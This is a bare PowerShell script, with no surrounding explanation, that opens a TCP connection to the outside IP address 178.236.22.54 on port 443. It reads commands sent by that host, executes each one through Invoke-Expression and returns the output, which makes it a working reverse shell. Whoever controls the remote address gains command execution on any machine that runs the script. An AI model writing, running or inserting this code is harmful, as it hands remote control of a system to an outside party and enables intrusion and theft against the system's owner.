$tcp = New-Object System.Net.Sockets.TCPClient("178.236.22.54",443); $stream = $tcp.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; while($true){$command = $reader.ReadLine(); if($command){$output = Invoke-Expression $command 2>&1; if ($output -is [System.Collections.IEnumerable]) {$output = $output | Out-String}; $writer.WriteLine($output)}else{$writer.WriteLine("No command received")}}; $reader.Close(); $writer.Close(); $stream.Close(); $tcp.Close();
